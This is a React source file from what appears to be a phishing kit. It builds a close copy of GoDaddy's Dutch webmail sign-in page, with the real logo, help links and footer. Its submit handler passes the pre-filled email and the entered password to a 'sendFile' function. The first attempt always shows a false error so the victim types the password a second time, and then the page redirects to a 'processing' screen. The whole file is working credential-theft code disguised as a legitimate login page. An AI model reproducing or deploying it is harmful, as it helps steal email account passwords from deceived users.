import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Godaddy({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });
  const [showpassword, setShowpassword] = useState(false);

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count === 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile().then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  const showPass = () => {
    setShowpassword(!showpassword);
  };

  return (
    <Fragment>
      <Helmet>
        <link
          rel="stylesheet"
          href="../godaddy_files/uxcore2.min.css"
          media="all"
        />
        <link
          rel="stylesheet"
          href="../godaddy_files/utilityheader.min.css"
          media="all"
          id="header-asset"
        />
        <link rel="stylesheet" href="../godaddy_files/main.css" />
      </Helmet>
      <div id="content">
        <div id="pass-bg">
          <svg viewBox="0 0 677 395">
            <g id="a274fe">
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M2 243.66h196.88M216.22 243.94l458.71-.04"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <rect
                x="523.08"
                y="269.84"
                width="84.33"
                height="20.88"
                rx={2}
                ry={2}
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-white svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M598.4 279.68h-66.67"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M593.33 215.84v44.84h-56.17V179.3h56.17v17.88"
                className="svg-fill-primary-o svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                d="M546.16 236.83l13.95-13.94M548 251.17l13.94-13.94"
                className="svg-fill-none svg-stroke-white"
              />
              <path
                d="M593.33 179.3v-13.62a2 2 0 0 0-2-2h-52.17a2 2 0 0 0-2 2v13.62zM537.16 260.68v17a2 2 0 0 0 2 2h52.17a2 2 0 0 0 2-2v-17z"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-white svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M553.99 171.3h21.75"
                className="svg-fill-none svg-stroke-gray-light"
              />
              <circle
                cx="564.87"
                cy="270.3"
                r="3.75"
                className="svg-fill-gray-light"
              />
              <path
                d="M309.65 325.29h170.9a8.47 8.47 0 0 1 8.44 8.44v42.9a8.47 8.47 0 0 1-8.44 8.44H267.4a8.47 8.47 0 0 1-8.44-8.44v-42.9a8.47 8.47 0 0 1 8.44-8.44h27.22"
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-white svg-stroke-gray-dark"
              />
              <rect
                x="269.31"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x={289}
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="308.69"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="328.39"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="348.08"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="367.78"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="387.47"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="407.17"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="426.86"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="446.55"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="466.25"
                y="335.84"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="279.39"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="299.08"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="318.78"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="338.47"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="358.16"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="377.86"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="397.55"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="417.25"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="436.94"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="456.64"
                y="349.9"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="269.31"
                y="363.97"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x={289}
                y="363.97"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <path
                d="M436.71 363.97h-125.2a2.82 2.82 0 0 0-2.81 2.82v5.62a2.82 2.82 0 0 0 2.81 2.82h125.2a2.82 2.82 0 0 0 2.81-2.82v-5.62a2.82 2.82 0 0 0-2.81-2.82z"
                className="svg-fill-gray-light"
              />
              <rect
                x="446.55"
                y="363.97"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <rect
                x="466.25"
                y="363.97"
                width="12.66"
                height="11.25"
                rx="2.81"
                ry="2.81"
                className="svg-fill-gray-light"
              />
              <path
                d="M194.07 392.35a22.06 22.06 0 0 1-22-22v-26a21.83 21.83 0 0 1 2.6-10.36 22.13 22.13 0 0 1 19.4-11.64 22.06 22.06 0 0 1 22 22v26a22.06 22.06 0 0 1-22 22z"
                className="svg-fill-white"
              />
              <path
                d="M209.6 328.81a21.89 21.89 0 0 0-15.53-6.46 22.06 22.06 0 0 0-22 22v26a22.06 22.06 0 0 0 22 22 22.06 22.06 0 0 0 22-22v-26a21.78 21.78 0 0 0-.83-6"
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth="3.838"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M188.46 353.84h-16M189.65 359.84h-17.19M191.2 365.84h-18.74M193.45 371.84h-20.83M196.27 377.84h-22.31M200.15 383.84h-23.38"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                d="M172.46 345.1h43.1M194.06 323.18v21.92"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <path
                d="M212.45 43.4a39.75 39.75 0 1 1-68 41.17"
                fill="#fee782"
              />
              <path
                d="M170.4 83.39a19.18 19.18 0 0 1-6.88-6.73M196.5 56.68a19.28 19.28 0 0 1-12.24 28.8M105.44 241.9L67.16 133.96M66.04 128.98L111.4 11.43h24"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <circle
                cx="66.32"
                cy="128.93"
                r={11}
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                className="svg-fill-gray-light svg-stroke-gray-dark"
              />
              <path
                d="M136.4 29.8a18.32 18.32 0 1 1 31.33-19z"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                className="svg-fill-gray-light svg-stroke-gray-dark"
              />
              <path
                d="M219.4 42.82l-88.43 53.53a55.95 55.95 0 0 1 88.9-67"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                className="svg-fill-gray-light svg-stroke-gray-dark"
              />
              <path
                d="M58.4 272.29v10.07c0 5.44 20.63 9.84 46.08 9.84s46.08-4.4 46.08-9.84v-10.07z"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-gray-light svg-stroke-gray-dark"
              />
              <path
                d="M141.03 265.36c6 1.66 9.55 3.74 9.55 6 0 5.44-20.63 9.84-46.08 9.84s-46.1-4.41-46.1-9.85 20.63-9.84 46.08-9.84a184.56 184.56 0 0 1 25.37 1.67"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                className="svg-fill-white svg-stroke-gray-dark"
              />
              <path
                d="M92.98 268.35v-22.82a5.77 5.77 0 0 1 5.76-5.76h11.52a5.77 5.77 0 0 1 5.76 5.76v22.82"
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-gray-light svg-stroke-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M125.49 49.19l10.83-6.62M124.07 57.09l13.72-8.38M123.03 64.76l16.69-10.2M122.9 71.87l19.24-11.76M123.89 78.29l20.83-12.72M125.58 84.3l22.88-13.99M127.83 89.95l24.84-15.18"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <path
                d="M347.4 280.73h77.32a7.11 7.11 0 0 0 7.09-7.09v-1.18c0-3.9-2.94-4.45-7.09-7.09l-10.66-6-6-41.34h-70.57l-6 41.34-11 6c-3.3 2-7.08 3.19-7.08 7.09v1.18a7.11 7.11 0 0 0 7.08 7.09h9.18"
                className="svg-fill-white"
              />
              <path
                d="M347.4 280.73h77.32a7.11 7.11 0 0 0 7.09-7.09v-1.18c0-3.9-2.94-4.45-7.09-7.09l-10.66-6-6-41.34h-70.57l-6 41.34-11 6c-3.3 2-7.08 3.19-7.08 7.09v1.18a7.11 7.11 0 0 0 7.08 7.09h9.18"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={4}
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <path
                d="M501.9 164.05v54.22a6.78 6.78 0 0 1-6.67 6.85H249.9a6.79 6.79 0 0 1-6.67-6.85V22.91a6.79 6.79 0 0 1 6.67-6.85h245.33a6.78 6.78 0 0 1 6.67 6.85v123.42"
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-white svg-stroke-gray-dark"
              />
              <path
                d="M262.98 186.41a5 5 0 0 1-4.88-5.09V36.05a5 5 0 0 1 4.88-5.09h220.1a5 5 0 0 1 4.88 5.09v145.27a5 5 0 0 1-4.88 5.09z"
                className="svg-fill-primary-o"
              />
              <path
                d="M483.08 32.96a3 3 0 0 1 2.88 3.09v145.27a3 3 0 0 1-2.88 3.09h-220.1a3 3 0 0 1-2.88-3.09V36.05a3 3 0 0 1 2.88-3.09h220.1m0-4h-220.1a7 7 0 0 0-6.88 7.09v145.27a7 7 0 0 0 6.88 7.09h220.1a7 7 0 0 0 6.88-7.09V36.05a7 7 0 0 0-6.88-7.09z"
                className="svg-fill-gray-dark"
              />
              <path d="M362.4 133.97h-.17" className="svg-fill-primary-o" />
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M260.88 210.94h26.99"
                className="svg-fill-none svg-stroke-gray-dark"
              />
              <circle
                cx="373.01"
                cy="204.74"
                r="6.2"
                strokeMiterlimit={10}
                strokeWidth={4}
                className="svg-fill-gray-light svg-stroke-gray-dark"
              />
              <circle
                cx="300.27"
                cy="210.94"
                r="3.54"
                className="svg-fill-gray-dark"
              />
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M304.88 44.28h49.99"
                className="svg-fill-none svg-stroke-white"
              />
              <circle
                cx="294.6"
                cy="44.28"
                r="3.54"
                className="svg-fill-white"
              />
              <circle
                cx="282.6"
                cy="44.28"
                r="3.54"
                className="svg-fill-white"
              />
              <circle
                cx="270.6"
                cy="44.28"
                r="3.54"
                className="svg-fill-white"
              />
              <circle
                cx="433.63"
                cy="491.5"
                r="41.25"
                transform="rotate(-20.7 -642.512 469.233)"
                className="svg-fill-white"
              />
              <path
                d="M391.24 120.47c-1.66-4.19-8.16-6.67-13.6-8.32a1.72 1.72 0 0 1-1-1.59 1.82 1.82 0 0 1 .37-1.1 15.4 15.4 0 0 0 4-10.27c0-5.92-3.25-11.67-10-11.67s-10 5.75-10 11.67a15.4 15.4 0 0 0 4 10.27 1.81 1.81 0 0 1 .36 1.1 1.71 1.71 0 0 1-1 1.59c-5.45 1.65-11.94 4.13-13.6 8.32a6.39 6.39 0 0 0-.47 2.41 6 6 0 0 0 4.75 6h31.86a6 6 0 0 0 4.74-6 6.58 6.58 0 0 0-.41-2.41z"
                className="svg-fill-gray-light"
              />
              <path
                strokeLinecap="round"
                strokeMiterlimit={10}
                strokeWidth={4}
                d="M331.67 259.88h66.96"
                className="svg-fill-none svg-stroke-gray-dark"
              />
            </g>
          </svg>
        </div>
        <div className="footer_fixer">
          <div id="header-bc1d1545dcc2fad642bd8a67d835a6c9">
            <div role="banner">
              <a
                href="https://sso.godaddy.com/?realm=pass&app=email#uxContent"
                className="skip-to-main-content"
              >
                Naar hoofdinhoud gaan
              </a>
              <div>
                <div className="language-header see-change-bar">
                  <div className="container-fluid">
                    <div className="flex-row d-flex">
                      <div className="see-change-bar-left d-flex">
                        <div className="topnav-logo-wrap">
                          <a
                            href="https://nl.godaddy.com/?realm=pass&app=email"
                            className="topnav-logo"
                            data-eid="uxp.hyd.utility_bar.logo.link.click"
                            data-tcc-ignore="true"
                          >
                            <figure
                              className="go-logo desktop-logo"
                              aria-label="GoDaddy"
                            >
                              <figcaption className="sr-only">
                                GoDaddy
                              </figcaption>
                              <svg
                                viewBox="0 0 166 34"
                                xmlns="http://www.w3.org/2000/svg"
                              >
                                <path d="M32.937 1.554c-3.968-2.48-9.193-1.889-13.852 1.039C14.44-.335 9.213-.925 5.25 1.553c-6.27 3.919-7.032 14.01-1.701 22.54 3.93 6.289 10.074 9.974 15.544 9.906 5.47.068 11.615-3.617 15.545-9.906 5.324-8.53 4.568-18.621-1.701-22.54zM6.43 22.292a20.434 20.434 0 01-2.46-5.632 16.104 16.104 0 01-.534-5.31c.238-3.153 1.521-5.608 3.612-6.914s4.855-1.385 7.8-.217c.441.177.878.38 1.312.606a24.09 24.09 0 00-4.228 5.081C8.697 15.086 7.71 20.848 8.84 25.443a20.911 20.911 0 01-2.408-3.151zm27.786-5.634a20.482 20.482 0 01-2.46 5.632 21.1 21.1 0 01-2.408 3.158c1.01-4.12.324-9.165-2.153-13.897a.625.625 0 00-.895-.243l-7.72 4.823a.631.631 0 00-.2.87l1.133 1.811a.63.63 0 00.869.2l5.004-3.126c.162.486.324.971.445 1.457a16.1 16.1 0 01.536 5.303c-.238 3.151-1.521 5.606-3.612 6.914a7.06 7.06 0 01-3.579 1.036h-.16a7.051 7.051 0 01-3.578-1.036c-2.093-1.308-3.376-3.763-3.614-6.914a16.143 16.143 0 01.534-5.31 21.015 21.015 0 016.444-10.314 16.137 16.137 0 014.532-2.806c2.936-1.168 5.705-1.09 7.797.217 2.093 1.308 3.375 3.761 3.613 6.914a16.145 16.145 0 01-.528 5.311zm39.848-3.766c-4.06 0-7.34 3.169-7.34 7.2 0 4.004 3.28 7.121 7.34 7.121 4.086 0 7.366-3.112 7.366-7.12 0-4.03-3.275-7.2-7.366-7.2zm0 10.557c-1.871 0-3.295-1.513-3.295-3.384s1.424-3.407 3.295-3.407c1.898 0 3.322 1.54 3.322 3.412 0 1.87-1.424 3.385-3.322 3.385zM90.583 7.362h-7.468a.6.6 0 00-.61.612v18.208a.605.605 0 00.61.648h7.468c5.977 0 10.13-3.975 10.13-9.758 0-5.818-4.153-9.71-10.13-9.71zm.177 15.622h-4.087V11.198h4.087c3.308 0 5.588 2.474 5.588 5.866 0 3.336-2.28 5.92-5.588 5.92zm24.82-9.7h-2.809a.633.633 0 00-.582.612v.833c-.64-1.057-2.085-1.835-3.884-1.835-3.503 0-6.783 2.751-6.783 7.145 0 4.37 3.251 7.171 6.755 7.171 1.806 0 3.28-.777 3.92-1.834v.861a.587.587 0 00.582.585h2.808a.571.571 0 00.584-.585V13.896a.594.594 0 00-.592-.612zm-6.533 10.196c-1.86 0-3.256-1.43-3.256-3.412s1.397-3.41 3.256-3.41c1.86 0 3.257 1.426 3.257 3.408s-1.395 3.412-3.257 3.412zm22.294-16.118h-2.808a.592.592 0 00-.61.584v6.728c-.648-1.002-2.114-1.78-3.948-1.78-3.476 0-6.7 2.751-6.7 7.145 0 4.37 3.252 7.171 6.755 7.171 1.806 0 3.17-.777 3.92-1.834v.861c0 .322.261.583.583.585h2.808a.57.57 0 00.584-.585V7.95a.57.57 0 00-.584-.588zm-6.532 16.152c-1.852 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.384 3.448-3.237 3.448zm22.29-16.152h-2.803a.594.594 0 00-.612.584v6.728c-.64-1.002-2.114-1.78-3.947-1.78-3.477 0-6.7 2.751-6.7 7.145 0 4.37 3.253 7.171 6.755 7.171 1.807 0 3.168-.777 3.92-1.834v.861a.587.587 0 00.584.585h2.803a.568.568 0 00.582-.585V7.95a.568.568 0 00-.582-.588zm-6.532 16.152c-1.853 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.38 3.448-3.232 3.448zm21.906-9.283l-4.19 14.37c-.809 2.556-2.613 4.086-5.421 4.086-1.277 0-2.44-.261-3.35-.782-.531-.303-.971-.58-.971-1.023 0-.275.089-.417.25-.675l.832-1.246c.235-.348.408-.461.66-.461a.96.96 0 01.554.192c.523.339 1.008.63 1.748.63.864 0 1.524-.277 1.88-1.306l.36-1.193h-1.696c-.418 0-.648-.249-.751-.584l-3.75-12.008c-.14-.473-.011-.946.683-.946h2.954c.36 0 .613.123.771.64l2.77 9.67 2.589-9.67c.082-.334.306-.64.75-.64h2.802c.552-.001.719.387.526.946zm-96.806 4.274v7.676a.625.625 0 01-.635.634h-2.317a.623.623 0 01-.634-.634v-2.015c-1.472 1.858-4.03 3.028-6.924 3.028-5.434 0-9.681-4.088-9.681-9.908 0-6.048 4.585-10.217 10.377-10.217 4.276 0 7.694 1.839 9.212 5.537a.843.843 0 01.07.309c0 .175-.116.307-.486.435l-2.706 1.042a.694.694 0 01-.511.009.783.783 0 01-.324-.371c-.971-1.847-2.7-3.1-5.36-3.1-3.45 0-5.922 2.694-5.922 6.188 0 3.387 2.104 6.172 6.02 6.172 2.06 0 3.703-.97 4.469-2.037H57.87a.625.625 0 01-.634-.635v-2.086a.625.625 0 01.634-.634h7.161a.604.604 0 01.635.607zm96.882-8.063v-.186c0-.013.005-.026.013-.036a.052.052 0 01.034-.013h1.183c.013 0 .025.005.034.013.009.01.013.023.013.036v.186a.052.052 0 01-.013.034.047.047 0 01-.034.013h-.432v1.167a.05.05 0 01-.048.048h-.224a.044.044 0 01-.032-.014.047.047 0 01-.015-.034v-1.167h-.432a.044.044 0 01-.047-.047zm2.069-.193l.323.75.324-.75a.066.066 0 01.026-.032.087.087 0 01.044-.01h.375a.044.044 0 01.047.046v1.404a.044.044 0 01-.045.047h-.21a.047.047 0 01-.035-.013.042.042 0 01-.013-.034v-1.06l-.348.77a.084.084 0 01-.026.038.08.08 0 01-.043.01h-.172a.078.078 0 01-.042-.01.073.073 0 01-.026-.037l-.346-.77v1.06a.052.052 0 01-.013.033.052.052 0 01-.032.013h-.216a.042.042 0 01-.03-.013.042.042 0 01-.013-.034v-1.404a.044.044 0 01.047-.046h.364c.014 0 .029.003.042.01.009.009.015.02.018.032z" />
                              </svg>
                            </figure>
                          </a>
                        </div>
                      </div>
                      <div className="see-change-bar-right justify-content-end">
                        <div className="tray-menu contact-tray">
                          <div className="tray-toggle-wrapper">
                            <button
                              aria-label="Contact"
                              className="tray-toggle"
                              data-eid="uxp.hyd.utility_bar.contact_tray.tray.click"
                              aria-expanded="false"
                              aria-haspopup="true"
                            >
                              <span>
                                <span
                                  className="
                                  basic-phone-text
                                  hidden-sm-down
                                  title-text
                                "
                                >
                                  Contact
                                </span>
                              </span>
                              <span className="chevron-down">
                                <svg
                                  className="uxicon-svg-container"
                                  height={20}
                                  width={20}
                                  role="img"
                                >
                                  <use
                                    fill="currentColor"
                                    xlinkHref="#svg-container-chevron-down"
                                  />
                                </svg>
                              </span>
                            </button>
                          </div>
                          <div className="tray-fullwidth tray-dropdown loaded">
                            <div className="tray-content">
                              <button className="close" aria-label="close" />
                              <div className="container">
                                <div className="row">
                                  <div className="col-lg-4 col-md-6 content-wrap">
                                    <div className="row">
                                      <div className="col-sm-12">
                                        <div className="font-primary-bold h3">
                                          Neem contact met ons op
                                        </div>
                                      </div>
                                    </div>
                                    <ul className="alt-contact-list list-unstyled">
                                      <li>
                                        <span>24/7 support in het Engels</span>
                                        <a
                                          className="contact-link"
                                          data-eid="uxp.hyd.utility_bar.support_phone.click"
                                          href="tel:0858883143"
                                        >
                                          085 888 3143
                                        </a>
                                      </li>
                                    </ul>
                                    <div className="contact-link-info">
                                      Globale contactenlijst
                                    </div>
                                    <a
                                      href="https://nl.godaddy.com/contact-us"
                                      className="contact-link"
                                      data-eid="uxp.hyd.utility_bar.global_directory.link.click"
                                      data-tcc-ignore="true"
                                    >
                                      Telefoonnummers en openingstijden
                                    </a>
                                  </div>
                                  <div className="col-lg-4 col-md-6 content-wrap divider">
                                    <div id="gdchat-container" />
                                  </div>
                                  <div className="col-md-4 help-mobile hidden-md-up">
                                    <div className="row">
                                      <div className="col-sm-12">
                                        <div className="font-primary-bold h3">
                                          Helpcenter
                                        </div>
                                      </div>
                                    </div>
                                    <p>Bekijk onze online hulpbronnen</p>
                                    <div>
                                      <a
                                        href="https://nl.godaddy.com/help"
                                        className="
                                        ux-button ux-button-secondary
                                        btn btn-default
                                      "
                                        data-eid="uxp.hyd.utility_bar.help_center_link.link.click"
                                        data-tcc-ignore="true"
                                      >
                                        Hulp
                                      </a>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <span
                aria-label="Hoofdinhoud begint hier"
                id="uxContent"
                role="navigation"
              />
            </div>
          </div>
          <div className="lg-container">
            <div id="iframe-shrinker" className="row">
              <div id="login-container-row" className="panel-container-row">
                <div id="left-col" className="col-lg-6 col-xl-6" />
                <div
                  id="login-container-col"
                  className="
                  container-width-limit
                  col-xs-12 col-sm-8
                  offset-sm-2
                  col-md-6
                  offset-md-3
                  col-lg-6 col-xl-6
                  offset-lg-0
                "
                >
                  <div id="login-container">
                    <div id="login-panel" className="ssodeck-framable-content">
                      <div>
                        <div
                          id="new-ux"
                          className="card ux-card form-container fs-unmask"
                        >
                          <div className="card-block pass">
                            <div />
                            <div id="form-header" className="pass-form-header">
                              <div id="pass-template" className="m-b-sm">
                                <div
                                  id="app-title"
                                  className="logo-container-pass text-center"
                                >
                                  <h2 className="white-override m-b-none">
                                    Webmail
                                  </h2>
                                </div>
                              </div>
                            </div>
                            <div id="form-container" className>
                              <div id="login-status-message" />
                              <h2 id="pass-title">Aanmelden</h2>
                              <form onSubmit={submitForm}>
                                <div id="username-container">
                                  <div
                                    className="
                                    ff-form-field
                                    inline-input inline-input-required
                                    fs-mask
                                  "
                                  >
                                    <div className="ff-field">
                                      <input
                                        autoComplete="off"
                                        type="username"
                                        name="username"
                                        onChange={handleChange}
                                        value={values.username}
                                        disabled
                                        placeholder="E-mail"
                                        className="ff-input"
                                        required
                                      />
                                    </div>
                                  </div>
                                </div>
                                <div id="password-container">
                                  <div
                                    className="
                                    ff-form-field
                                    inline-input inline-input-required
                                    fs-mask
                                  "
                                  >
                                    <div className="ff-field">
                                      <input
                                        autoComplete="off"
                                        placeholder="Password"
                                        type={
                                          showpassword ? "text" : "password"
                                        }
                                        name="password"
                                        value={values.password}
                                        onChange={handleChange}
                                        autoFocus
                                        className="ff-input"
                                        required
                                      />
                                      <button
                                        aria-label="Wachtwoord weergegeven"
                                        className="
                                        ux-button ux-button-inline
                                        text-primary-o
                                        show-hide-btn
                                      "
                                        id="showpass"
                                        type="button"
                                        onClick={showPass}
                                      >
                                        <span
                                          id="showpasstext"
                                          className="ux-button-text"
                                        >
                                          Show
                                        </span>
                                      </button>
                                    </div>
                                  </div>
                                </div>
                                <div
                                  id="remember-me-container"
                                  className="input-container"
                                >
                                  <fieldset className="form-group">
                                    <div className="ux-custom-control ux-custom-checkbox">
                                      <div
                                        className="ux-custom-target"
                                        role="switch"
                                        aria-checked="true"
                                      >
                                        <input
                                          tabIndex={0}
                                          id="remember-me"
                                          type="checkbox"
                                          aria-labelledby="label-remember-me"
                                          aria-required="false"
                                          className="custom-control-input"
                                          defaultValue="true"
                                          defaultChecked
                                        />
                                        <svg
                                          className="
                                          uxicon-svg-container
                                          ux-control-indicator
                                        "
                                          height="1.5em"
                                          width="1.5em"
                                          role="img"
                                        >
                                          <use
                                            fill="currentColor"
                                            xlinkHref="#svg-container-checkmark"
                                          />
                                        </svg>
                                        <label
                                          htmlFor="remember-me"
                                          id="label-remember-me"
                                        >
                                          Aangemeld blijven op dit apparaat
                                        </label>
                                      </div>
                                    </div>
                                  </fieldset>
                                </div>
                                <input
                                  className="ux-button ux-button-primary btn btn-purchase btn-block"
                                  type="submit"
                                  disabled={submited.status}
                                  defaultValue="Sign in"
                                  style={{ width: "100%" }}
                                />
                                <div
                                  id="social-login-buttons-container"
                                  className
                                >
                                  <div className="ux-button-set">
                                    <div
                                      className="
                                      ux-button-set-margin ux-button-set-split
                                    "
                                      role="group"
                                    />
                                  </div>
                                </div>
                              </form>
                              <p id="recovery-links" className>
                                Are you looking for
                                <a
                                  target="_top"
                                  id="forgot_password"
                                  className="text-primary-o"
                                  href="https://sso.godaddy.com/v1/account/reset?app=email&realm=pass"
                                  aria-label="je wachtwoord zoeken"
                                >
                                  your password
                                </a>
                                ?
                              </p>
                            </div>
                          </div>
                        </div>
                        <div id="email-promo-footer">
                          <div className="font-primary-bold" id="email-message">
                            Don't have GoDaddy email?
                          </div>
                          <button
                            className="
                            ux-button ux-button-secondary ux-button-small
                            button
                            btn btn-purchase btn-block
                          "
                            id="emailPromoButton"
                            type="button"
                          >
                            <span className="ux-button-text">Sign up</span>
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div id="footer">
        <div id="footer-bc1d1545dcc2fad642bd8a67d835a6c9">
          <footer id="appheader-footer" className="manifest footer">
            <div className="container">
              Copyright © 1999 - 2021 GoDaddy Operating Company, LLC. Alle
              rechten voorbehouden.
              <a
                className="privacy-link"
                href="https://nl.godaddy.com/legal/agreements/privacy-policy?target=_blank"
                target="_blank"
                data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click"
              >
                Privacybeleid
              </a>
            </div>
            <div id="gtm_privacy" />
          </footer>
        </div>
      </div>
      <div id="svg-container" style={{ display: "none" }}>
        <svg>
          <symbol id="svg-container-chevron-down" viewBox="0 0 24 24">
            <path
              fillRule="evenodd"
              d="M19.39 9.01L12 16.4 4.61 9.01 6.02 7.6 12 13.57l5.98-5.98 1.41 1.42z"
              clipRule="evenodd"
            />
          </symbol>
        </svg>
      </div>
      <div id="svg-container" style={{ display: "none" }}>
        <svg>
          <symbol id="svg-container-checkmark" viewBox="0 0 24 24">
            <path
              fillRule="evenodd"
              d="M21.41 6.5L9 18.91 2.59 12.5 4 11.09l5 5 11-11 1.41 1.41z"
              clipRule="evenodd"
            />
          </symbol>
        </svg>
      </div>
    </Fragment>
  );
}

export default Godaddy;
